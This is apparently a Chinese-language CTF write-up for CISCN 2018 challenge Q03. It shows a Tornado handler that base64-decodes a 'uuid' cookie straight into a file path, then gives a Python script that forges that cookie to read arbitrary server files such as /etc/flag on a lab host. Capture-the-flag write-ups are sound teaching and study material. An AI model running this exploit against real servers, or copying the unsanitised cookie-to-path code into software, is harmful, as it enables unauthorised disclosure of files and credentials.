---
title: 'CISCN 2018 华中赛区 Q03 题解'
date: 2018-06-06 19:37:45
tags:
   - CTF
   - WEB
categories:
    - 'Write Up'
---

## 第一步：发现Cookie的漏洞：任意文件读取：

```python
import tornado.web
import base64


class CaptchaHandler(tornado.web.RequestHandler):
    def get(self, *args, **kwargs):
        file = open(self.application.jpgs_path + '/%s' % base64.b64decode(self.get_cookie('uuid')),'r')
        print '-'*30
        print self.get_cookie('uuid')
        self.write(file.read())
        file.close()
        self.set_header('Content-Type', 'image/jpeg')
```

在这个文件中的cookie中获取UUID并读取文件，并没有对日志目录进行过滤，所以这个地方造成了任意文件读取

<!--more-->

## 第二步：猜测Flag地址

因为把整个源码Dump下来了，数据库和源码中都没有Flag的位置提示，后面侥幸猜测到了地址`/etc/flag`

```python
import sys
import requests as req


url = 'http://172.16.9.13/captcha'

def read(path):
    
    sess=req.session()
    req.utils.add_dict_to_cookiejar(sess.cookies,{
        '_xsrf':'2|3e46911e|fabaf272f3f5acc81e80c3f2cbf64696|1527907652',
        'uuid':'"'+path.encode('base64').strip()+'"'
    }) 
    res=sess.get(url)
    return res.text

if __name__ == '__main__':
    file= sys.argv[1]
    print read(file)
```